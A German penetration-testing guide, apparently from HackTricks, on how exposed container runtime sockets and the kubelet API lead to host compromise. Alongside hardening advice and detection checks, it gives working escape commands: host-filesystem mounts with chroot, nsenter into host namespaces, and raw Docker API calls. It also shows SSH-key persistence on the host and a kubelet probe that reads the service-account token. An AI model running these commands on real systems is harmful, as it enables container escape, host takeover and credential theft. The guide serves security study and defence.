# Runtime-API und Daemon-Exposition

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Viele reale Container-Kompromittierungen beginnen überhaupt nicht mit einem Namespace-Escape. Sie beginnen mit Zugriff auf die Runtime-Steuerungsebene. Kann eine Workload über einen eingebundenen Unix-Socket oder einen exponierten TCP-Listener mit `dockerd`, `containerd`, CRI-O, Podman oder kubelet kommunizieren, kann der Angreifer möglicherweise einen neuen Container mit höheren Berechtigungen anfordern, das Host-Dateisystem einbinden, Host-Namespaces beitreten oder sensible Node-Informationen abrufen. In diesen Fällen ist die Runtime-API die eigentliche Sicherheitsgrenze, und ihre Kompromittierung kommt funktional einer Kompromittierung des Hosts nahe.

Deshalb sollte die Exposition von Runtime-Sockets getrennt von Kernel-Schutzmaßnahmen dokumentiert werden. Ein Container mit gewöhnlichem seccomp, Capabilities und MAC-Einschränkungen kann dennoch nur einen API-Aufruf von einer Host-Kompromittierung entfernt sein, wenn `/var/run/docker.sock` oder `/run/containerd/containerd.sock` in ihn eingebunden ist. Die Kernel-Isolation des aktuellen Containers kann genau wie vorgesehen funktionieren, während die Runtime-Verwaltungsebene weiterhin vollständig exponiert ist.

## Zugriffsmodelle für Daemons

Docker Engine stellt seine privilegierte API traditionell über den lokalen Unix-Socket `unix:///var/run/docker.sock` bereit. Historisch wurde sie auch remote über TCP-Listener wie `tcp://0.0.0.0:2375` oder einen TLS-geschützten Listener auf `2376` exponiert. Wird der Daemon ohne starkes TLS und Client-Authentifizierung remote exponiert, wird die Docker-API praktisch zu einer Remote-root-Schnittstelle.

containerd, CRI-O, Podman und kubelet exponieren ähnliche Angriffsflächen mit weitreichenden Auswirkungen. Die Namen und Abläufe unterscheiden sich, die Logik jedoch nicht. Ermöglicht die Schnittstelle dem Aufrufer, Workloads zu erstellen, Host-Pfade einzubinden, Zugangsdaten abzurufen oder laufende Container zu ändern, handelt es sich um einen privilegierten Verwaltungskanal, der entsprechend behandelt werden sollte.

Eine Weboberfläche zur Containerverwaltung kann dieselbe Grenze exponieren, ohne dem lokalen Konto direkten Socket-Zugriff zu gewähren. So dokumentierte [Portainer issue #493](https://github.com/portainer/portainer/issues/493) das Zurücksetzen des Administratorpassworts ohne Authentifizierung in einem älteren Build von Version 1.11.1. Betrachte eine lokal erreichbare UI lediglich als Ansatzpunkt für eine Überprüfung: Prüfe den installierten Build und das Authentifizierungsverhalten, die tatsächliche Administrator-Kontrolle sowie, ob der verwaltete Endpoint Container mit einem beschreibbaren Host-Bind-Mount erstellen kann. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket), dass socketbasierte Verwaltung Zugriff auf den Docker-Socket erfordert; ein rootless oder eingeschränkter Endpoint verändert die Auswirkungen auf den Host. Leite den Authentifizierungsfehler oder den Zugriff auf Host-root nicht allein aus einem Prozessnamen, Port oder Versionsstring ab.

Häufige lokale Pfade, die überprüft werden sollten, sind:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Ältere oder stärker spezialisierte Stacks können auch Endpunkte wie `dockershim.sock`, `frakti.sock` oder `rktlet.sock` bereitstellen. Diese sind in modernen Umgebungen weniger verbreitet. Wenn sie jedoch vorkommen, sollten sie mit derselben Vorsicht behandelt werden, da sie Runtime-Steuerungsschnittstellen und keine gewöhnlichen Anwendungssockets darstellen.

## Sicherer Fernzugriff

Wenn ein Daemon über den lokalen Socket hinaus erreichbar sein muss, sollte die Verbindung mit TLS geschützt werden, vorzugsweise mit gegenseitiger Authentifizierung, sodass der Daemon den Client und der Client den Daemon verifiziert. Die alte Gewohnheit, den Docker-Daemon der Einfachheit halber über unverschlüsseltes HTTP bereitzustellen, ist einer der gefährlichsten Fehler bei der Containerverwaltung, da die API leistungsfähig genug ist, um direkt privilegierte Container zu erstellen.

Das historische Docker-Konfigurationsmuster sah so aus:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Auf systemd-basierten Hosts kann die Daemon-Kommunikation auch als `fd://` erscheinen. Das bedeutet, dass der Prozess einen bereits von systemd geöffneten Socket übernimmt, anstatt selbst direkt daran zu binden. Die wichtige Lehre ist nicht die genaue Syntax, sondern die sicherheitsrelevante Konsequenz. Sobald der Daemon über einen Socket lauscht, dessen Zugriff nicht eng beschränkt ist, werden Transportsicherheit und Client-Authentifizierung zwingend erforderlich und sind keine optionale Härtung mehr.

## Missbrauch

Wenn ein Runtime-Socket vorhanden ist, prüfe, um welchen es sich handelt, ob ein kompatibler Client verfügbar ist und ob ein direkter Zugriff über HTTP oder gRPC möglich ist:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Diese Befehle sind nützlich, weil sie zwischen einem nicht erreichbaren Pfad, einem eingebundenen, aber nicht zugänglichen Socket und einer aktiven privilegierten API unterscheiden. Wenn der Client erfolgreich ist, stellt sich als Nächstes die Frage, ob die API einen neuen Container mit einem Host-Bind-Mount oder gemeinsam genutztem Host-Namespace starten kann.

### Wenn kein Client installiert ist

Dass `docker`, `podman` oder eine andere benutzerfreundliche CLI fehlt, bedeutet nicht, dass der Socket sicher ist. Docker Engine kommuniziert über HTTP auf seinem Unix-Socket, und Podman stellt sowohl eine Docker-kompatible API als auch eine native Libpod-API über `podman system service` bereit. Das bedeutet, dass eine minimale Umgebung, in der nur `curl` vorhanden ist, möglicherweise ausreicht, um den Daemon zu steuern:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Bei PHP-Codeausführung mit `open_basedir`-Einschränkungen bleiben [Unix-Socket-Verbindungen ein separater Weg](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir), sofern der PHP-Prozess die OS-Berechtigung zum Verbinden hat.

Das ist während der post-exploitation relevant, weil Verteidiger manchmal die üblichen Client-Binaries entfernen, den Management-Socket aber eingebunden lassen. Auf Podman-Hosts solltest du beachten, dass sich der Pfad mit hohem Wert bei rootful- und rootless-Bereitstellungen unterscheidet: `unix:///run/podman/podman.sock` für rootful-Dienstinstanzen und `unix://$XDG_RUNTIME_DIR/podman/podman.sock` für rootless-Instanzen.

### Vollständiges Beispiel: Vom Docker-Socket zu Host-Root

Wenn `docker.sock` erreichbar ist, besteht der klassische Escape darin, einen neuen Container zu starten, der das Root-Dateisystem des Hosts einbindet, und anschließend mit `chroot` dorthin zu wechseln:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Dies ermöglicht die direkte Ausführung mit Host-root-Rechten über den Docker-Daemon. Die Auswirkungen beschränken sich nicht auf das Lesen von Dateien. Im neuen Container kann der Angreifer Host-Dateien verändern, Zugangsdaten abgreifen, Persistenz einrichten oder weitere privilegierte Workloads starten.

### Vollständiges Beispiel: Vom Docker-Socket zu Host-Namespaces

Wenn der Angreifer statt eines reinen Dateisystemzugriffs lieber in Namespaces eintritt:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Dieser Pfad erreicht den Host, indem die Runtime angewiesen wird, einen neuen Container mit expliziter Freigabe von Host-Namespaces zu erstellen, statt den aktuellen Container auszunutzen.

### Docker Socket Persistence Pattern

Die Runtime-Kontrolle kann auch zur Persistenz statt für eine einmalige Shell verwendet werden. Das allgemeine Muster besteht darin, einen Hilfscontainer mit einem Host-Mount zu erstellen, autorisiertes Zugriffsmaterial oder einen Startup-Hook in das eingebundene Host-Dateisystem zu schreiben und anschließend zu überprüfen, ob der Host dieses übernimmt.

Beispielaufbau:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Dieselbe Idee kann je nach gewünschtem Nachweis auf systemd-Units, Cron-Fragmente, Anwendungsstartdateien oder SSH-Schlüssel abzielen. Wichtig ist, dass die dauerhafte Änderung über die Dateisystemberechtigungen des Runtime-Daemons auf Hostebene vorgenommen wird und nicht durch zusätzliche Berechtigungen im ursprünglichen Container.

### Raw Docker API Helper Pivot

Wenn die Docker-CLI fehlt, lässt sich derselbe Host-Mount-Helper-Ablauf über HTTP auf dem Unix-Socket ausführen. Der allgemeine Ablauf ist: API bestätigen, einen Helper-Container mit einem Host-Bind-Mount erstellen, ihn starten, eine Exec-Instanz erstellen und diese Exec-Instanz starten.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Die abschließende Anfrage an `/exec/<id>/start` hängt von der zurückgegebenen Exec-ID ab, aber der sicherheitsrelevante Punkt ist unabhängig von der genauen JSON-Verarbeitung: Der direkte API-Zugriff auf einen rootful Docker-Daemon reicht aus, um eine leistungsfähigere Hilfs-Workload anzufordern.

### Vollständiges Beispiel: containerd-Socket

Ein eingebundener `containerd`-Socket ist in der Regel genauso gefährlich:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Wenn ein Docker-ähnlicher Client verfügbar ist, kann `nerdctl` praktischer sein als `ctr`, da es vertraute Flags wie `--privileged`, `--pid=host` und `-v` bereitstellt:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Die Auswirkungen sind erneut eine Host-Kompromittierung. Selbst wenn Docker-spezifische Tools fehlen, kann eine andere Runtime-API dieselben administrativen Möglichkeiten bieten. Auf Kubernetes-Knoten kann `crictl` für die Aufklärung und Interaktion mit Containern ebenfalls ausreichen, da es direkt mit dem CRI-Endpunkt kommuniziert.

### BuildKit-Socket

`buildkitd` wird leicht übersehen, weil viele es für „nur das Build-Backend“ halten. Der Daemon ist jedoch weiterhin eine privilegierte Steuerungsebene. Ein erreichbarer `buildkitd.sock` kann einem Angreifer ermöglichen, beliebige Build-Schritte auszuführen, die Fähigkeiten des Workers zu untersuchen, lokale Kontexte aus der kompromittierten Umgebung zu verwenden und gefährliche Entitlements wie `network.host` oder `security.insecure` anzufordern, sofern der Daemon entsprechend konfiguriert wurde.

Nützliche erste Interaktionen sind:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Wenn der Daemon Build-Anfragen akzeptiert, testen Sie, ob unsichere Entitlements verfügbar sind:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Die genauen Auswirkungen hängen von der Daemon-Konfiguration ab, aber ein rootful BuildKit-Service mit permissiven Berechtigungen ist keine harmlose Entwickler-Bequemlichkeit. Behandle ihn als weitere hochwertige administrative Angriffsfläche, insbesondere auf CI-Runnern und gemeinsam genutzten Build-Nodes.

### Kubelet-API über TCP

Der Kubelet ist keine Container-Runtime, gehört aber weiterhin zur Node-Verwaltungsebene und fällt oft unter dieselbe Diskussion über Vertrauensgrenzen. Wenn der sichere Kubelet-Port `10250` aus dem Workload erreichbar ist oder Node-Credentials, kubeconfigs oder Proxy-Rechte offengelegt werden, kann der Angreifer möglicherweise Pods auflisten, Logs abrufen oder Befehle in Node-lokalen Containern ausführen, ohne jemals den Admission-Pfad des Kubernetes-API-Servers zu berühren.

Beginne mit einer schnellen Erkundung:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Wenn der kubelet- oder API-server-Proxy-Pfad `exec` autorisiert, kann ein WebSocket-fähiger Client damit Code in anderen Containern auf dem Node ausführen. Deshalb ist auch `nodes/proxy` mit ausschließlich `get`-Berechtigung gefährlicher, als es klingt: Die Anfrage kann weiterhin kubelet-Endpunkte erreichen, die Befehle ausführen, und diese direkten Interaktionen mit kubelet tauchen nicht in normalen Kubernetes-Audit-Logs auf.<sup>[[2]](#references)</sup>

## Prüfungen

Mit diesen Prüfungen soll festgestellt werden, ob der Container eine Management-Ebene erreichen kann, die außerhalb der Vertrauensgrenze bleiben sollte.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Was hier interessant ist:

- Ein eingebundener Runtime-Socket ist in der Regel eine direkte administrative Zugriffsmöglichkeit und nicht bloß eine Offenlegung von Informationen.
- Ein TCP-Listener auf `2375` ohne TLS sollte als Bedingung für eine Remote-Kompromittierung behandelt werden.
- Umgebungsvariablen wie `DOCKER_HOST` weisen oft darauf hin, dass der Workload bewusst für die Kommunikation mit der Host-Runtime konzipiert wurde.

## Runtime-Standardeinstellungen

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächungen |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig lokaler Unix-Socket | `dockerd` lauscht auf dem lokalen Socket und der Daemon läuft üblicherweise mit Root-Rechten | Einbinden von `/var/run/docker.sock`, Freigabe von `tcp://...:2375`, schwaches oder fehlendes TLS auf `2376` |
| Podman | Standardmäßig Daemonless-CLI | Für die normale lokale Nutzung ist kein dauerhaft laufender privilegierter Daemon erforderlich; API-Sockets können dennoch freigegeben werden, wenn `podman system service` aktiviert ist | Freigabe von `podman.sock`, breit angelegter Betrieb des Dienstes, rootful API-Nutzung |
| containerd | Lokaler privilegierter Socket | Administrative API über den lokalen Socket verfügbar gemacht und üblicherweise von übergeordneten Tools genutzt | Einbinden von `containerd.sock`, breiter Zugriff auf `ctr` oder `nerdctl`, Freigabe privilegierter Namespaces |
| CRI-O | Lokaler privilegierter Socket | Der CRI-Endpunkt ist für vertrauenswürdige node-lokale Komponenten vorgesehen | Einbinden von `crio.sock`, Freigabe des CRI-Endpunkts für nicht vertrauenswürdige Workloads |
| Kubernetes kubelet | Node-lokale Verwaltungs-API | Kubelet sollte aus Pods nicht allgemein erreichbar sein; je nach Authentifizierung und Autorisierung kann der Zugriff Pod-Zustände, Zugangsdaten und Ausführungsfunktionen offenlegen | Einbinden von kubelet-Sockets oder -Zertifikaten, schwache kubelet-Authentifizierung, Host-Netzwerkmodus mit erreichbarem kubelet-Endpunkt |



## References

- [1] [Ausnutzung des containerd-Sockets, Teil 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Risiken von Umgehungen des Kubernetes API Servers](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
